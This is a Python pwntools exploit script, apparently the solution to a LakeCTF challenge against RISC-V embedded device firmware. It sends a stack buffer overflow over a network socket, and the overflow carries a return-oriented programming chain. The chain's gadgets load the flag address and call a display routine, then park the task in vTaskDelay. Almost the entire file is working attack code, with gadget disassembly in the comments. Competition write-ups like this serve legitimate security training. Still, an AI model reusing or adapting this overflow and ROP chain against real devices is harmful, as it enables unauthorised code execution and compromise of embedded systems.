#!/usr/bin/env python3
from pwn import *

# Intended solution: print flag to screen
# Unintended (probably also doable but I think quite a bit more painful): print
# flag to network socket

exe = ELF("./src/build/lakectf-ios.elf")
r = remote("192.168.4.1", 1337)

#420850e4:       40b2                    lw      ra,12(sp)
#420850e6:       4422                    lw      s0,8(sp)
#420850e8:       8526                    mv      a0,s1
#420850ea:       4492                    lw      s1,4(sp)
#420850ec:       0141                    addi    sp,sp,16
#420850ee:       8082                    ret
load_a0 = exe.symbols.get_rc_dout + 0x124
#403819ba:       4732                    lw      a4,12(sp)
#403819bc:       4785                    li      a5,1
#403819be:       00f70563                beq     a4,a5,403819c8 <timer_alarm_handler+0x24>
#403819c2:       40f2                    lw      ra,28(sp)
#403819c4:       6105                    addi    sp,sp,32
#403819c6:       8082                    ret
load_a4 = exe.symbols.timer_alarm_handler + 0x16
#420980de:       9702                    jalr    a4
#420980e0:       40b2                    lw      ra,12(sp)
#420980e2:       0141                    addi    sp,sp,16
#420980e4:       8082                    ret
jmp_a4 = exe.symbols.wifi_ap_receive + 0x1e

# Approach:
# 1. Load a0 with flag and ra, ret
# 2. Load a4 with scroll_label and ra, ret
# 3. Execute scroll_label and ret
# 4. Load ra and ret (infinitely)

stack = b"A" * 128 # padding
stack += b"AAAA" # s2
stack += p32(exe.symbols.flag) # s1
stack += b"AAAA" # s0
stack += p32(load_a0) # ra
# Now load flag address in a0
stack += b"A" * 12 # padding to new return address
stack += p32(load_a4)
# Now load scroll_label in a4
stack += b"A" * 12 # padding to a4
stack += p32(exe.symbols.scroll_label)
stack += b"A" * 12 # padding to new return address
stack += p32(jmp_a4)
# Now execute scroll_label and return from it, then load ra and sleep
stack += b"A" * 12  # padding to new return address
stack += p32(exe.symbols.vTaskDelay) # just make the task sleep basically forever

info(f"Payload len: {len(stack)}")
r.sendline(stack)
print(r.recvall(timeout=0.2))
